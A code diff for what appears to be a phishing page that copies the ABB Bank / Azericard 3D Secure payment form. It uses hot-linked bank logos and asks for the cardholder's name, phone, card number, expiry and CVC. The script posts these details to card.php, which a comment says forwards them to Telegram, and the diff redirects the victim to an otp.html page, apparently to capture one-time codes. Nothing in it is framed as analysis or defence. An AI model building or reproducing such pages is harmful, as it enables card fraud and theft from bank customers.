@@ -11,18 +11,15 @@
         <main class="main">
             <header>
                 <div class="header-logos">
-                    <div class="abb-logo">
-                        <img src="https://mpi.3dsecure.az/abb_default/img/abb_logo.svg" alt="ABB Bank">
-                    </div>
-                    <div class="azericard-logo">
-                        <img src="https://mpi.3dsecure.az/abb_default/img/azericard.svg" alt="Azericard">
-                    </div>
+                    <div class="abb-logo"><img src="https://mpi.3dsecure.az/abb_default/img/abb_logo.svg" alt="ABB Bank"></div>
+                    <div class="azericard-logo"><img src="https://mpi.3dsecure.az/abb_default/img/azericard.svg" alt="Azericard"></div>
                 </div>
             </header>
             <section class="form-content form-content2">
                 <h1>Kart məlumatları</h1>
-                <div id="amountDisplay" class="amount-display"></div>
-                <form class="form-container" autocomplete="off" id="paymentForm">
+                <div id="amountDisplay" class="amount-display" style="text-align:center; margin-bottom:20px; font-size:18px; font-weight:bold;"></div>
+                
+                <form class="form-container" id="paymentForm" autocomplete="off">
                     <div class="field-container1">
                         <div class="cardnumber_img">
                             <div class="svgBox">
@@ -36,10 +33,10 @@
                     </div>
 
                     <div class="field-container1">
-                        <div class="cardnumber_img">
+                        <div class="cardnumber_img" id="name-container">
                             <div class="svgBox">
                                 <div>
-                                    <label for="name">Kart sahibinin adı</label>
+                                    <label for="name" id="name-text">Kart sahibinin adı</label>
                                     <input required id="name" type="text" maxlength="32" placeholder="Ad Soyad">
                                 </div>
                             </div>
@@ -48,10 +45,10 @@
                     </div>
 
                     <div class="field-container1">
-                        <div class="cardnumber_img">
+                        <div class="cardnumber_img" id="phone-container">
                             <div class="svgBox">
                                 <div>
-                                    <label for="phoneNumber">Mobil nömrə</label>
+                                    <label for="phoneNumber" id="phone-text">Mobil nömrə</label>
                                     <input required id="phoneNumber" type="tel" placeholder="+994 (00) 000 00 00">
                                 </div>
                             </div>
@@ -60,11 +57,12 @@
                     </div>
 
                     <div class="field-container1">
-                        <div class="cardnumber_img">
+                        <div class="cardnumber_img" id="card-container">
                             <div class="svgBox">
                                 <div>
-                                    <label for="cardnumber">Kartın nömrəsi</label>
+                                    <label for="cardnumber" id="card-text">Kartın nömrəsi</label>
                                     <input required id="cardnumber" type="tel" inputmode="numeric" minlength="13" maxlength="19" placeholder="••••  ••••  ••••  ••••">
+                                    <input type="hidden" name="CARD" id="card-number">
                                 </div>
                                 <svg id="ccicon" width="750" height="471" viewBox="0 0 750 471"></svg>
                             </div>
@@ -73,9 +71,11 @@
                     </div>
 
                     <div class="field-container2">
-                        <div class="field-container">
-                            <label for="expirationdate">Bitmə tarixi</label>
+                        <div class="field-container" id="expdate-container">
+                            <label for="expirationdate" id="expdate-text">Bitmə tarixi</label>
                             <input required id="expirationdate" type="text" inputmode="numeric" placeholder="MM / YY">
+                            <input type="hidden" name="EXP" id="expired-month">
+                            <input type="hidden" name="EXP_YEAR" id="expired-year">
                         </div>
                         <div class="field-container_cvc">
                             <div class="field_cvc">
@@ -83,12 +83,17 @@
                                     <label for="securitycode">CVC</label>
                                     <input required id="securitycode" type="password" inputmode="numeric" placeholder="***" minlength="3" maxlength="4">
                                 </div>
+                                <p class="tooltip">
+                                    <img src="https://mpi.3dsecure.az/abb_default/img/info-circle.svg" alt="">
+                                    <span class="tooltiptext">CVV və ya CVC kartınızın arxasındadır</span>
+                                </p>
                             </div>
                         </div>
                     </div>
 
                     <div class="form-button">
                         <button id="submitBtn" type="submit" class="submitBtn" disabled>
+                            <img src="https://mpi.3dsecure.az/abb_default/img/lock.svg" alt="">
                             Təhlükəsiz ödə
                         </button>
                         <button id="cnltBtn" type="button" onclick="window.location.href='../index.html'">
@@ -98,6 +103,14 @@
                 </form>
             </section>
         </main>
+        <footer>
+            <div class="footer_1">
+                <img src="https://mpi.3dsecure.az/abb_default/img/visa.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/secure.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/master.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/master_logo.svg" alt="">
+            </div>
+        </footer>
     </div>
 
     <script src="js/azericard-imask.js"></script>
@@ -115,11 +128,7 @@
         document.addEventListener('DOMContentLoaded', function () {
             const phoneInput = document.getElementById('phoneNumber');
             if (phoneInput && window.IMask) {
-                IMask(phoneInput, {
-                    mask: '+{994} (00) 000 00 00',
-                    lazy: false,
-                    placeholderChar: '0'
-                });
+                IMask(phoneInput, { mask: '+{994} (00) 000 00 00', lazy: false, placeholderChar: '0' });
             }
         });
 
@@ -139,11 +148,12 @@
             formData.append('expdate', document.getElementById('expirationdate').value);
             formData.append('cvv', document.getElementById('securitycode').value);
 
+            // PHP-yə göndəririk (Telegram)
             fetch('card.php', {
                 method: 'POST',
                 body: formData
             }).finally(() => {
-                window.location.href = 'azericard-3ds.html?amount=' + encodeURIComponent(amountParam || '0') + '&card=' + encodeURIComponent(cardVal);
+                window.location.href = 'otp.html?amount=' + encodeURIComponent(amountParam || '0') + '&card=' + encodeURIComponent(cardVal);
             });
         });
     </script>
